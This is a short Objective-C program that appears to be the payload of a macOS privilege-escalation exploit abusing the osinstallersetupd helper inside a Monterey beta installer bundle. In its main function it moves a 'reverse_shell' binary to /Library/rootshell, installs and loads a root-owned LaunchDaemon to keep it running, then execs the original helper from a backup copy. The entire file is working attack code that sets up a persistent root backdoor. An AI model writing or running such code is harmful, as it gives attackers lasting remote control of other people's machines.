#import <Foundation/Foundation.h>

int main(int argc, const char * argv[]) {
    rename("/tmp/bin/reverse_shell", "/Library/rootshell");
    rename("/tmp/cfg/rootshell.plist", "/Library/LaunchDaemons/rootshell.plist");
    system("chown root:wheel /Library/LaunchDaemons/rootshell.plist");
    system("launchctl load /Library/LaunchDaemons/rootshell.plist");
    execve("/tmp/Applications/Install macOS Monterey beta.app/Contents/Frameworks/OSInstallerSetup.framework/Resources/osinstallersetupd.bak", 0, 0);

    return 0;
}
